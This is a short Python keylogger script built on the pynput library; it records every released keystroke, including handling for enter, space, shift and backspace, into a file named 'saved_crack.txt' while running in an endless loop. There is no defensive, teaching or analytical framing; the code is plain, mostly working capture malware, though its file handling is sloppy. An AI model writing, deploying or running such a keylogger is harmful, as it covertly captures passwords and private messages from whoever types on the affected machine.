from pynput import keyboard


def backspace():
    f = open("saved_crack.txt", "r+")
    txt_len = len(f.read())
    f.truncate(txt_len-1)
    f.close()


def on_release(key):
    if key == keyboard.Key.enter:
        key = "\n"
    elif(key == keyboard.Key.shift):
        key = ""
    elif(key == keyboard.Key.shift_r or key == keyboard.Key.shift_l):
        key = ""
    elif(key == keyboard.Key.space):
        key = " "
    elif(key == keyboard.Key.backspace):
        backspace()
        key = ""
    f.write(str(key).replace("'", ""))


listener = keyboard.Listener(
    on_release=on_release)
listener.start()

while True:
    f = open("saved_crack.txt", "a")
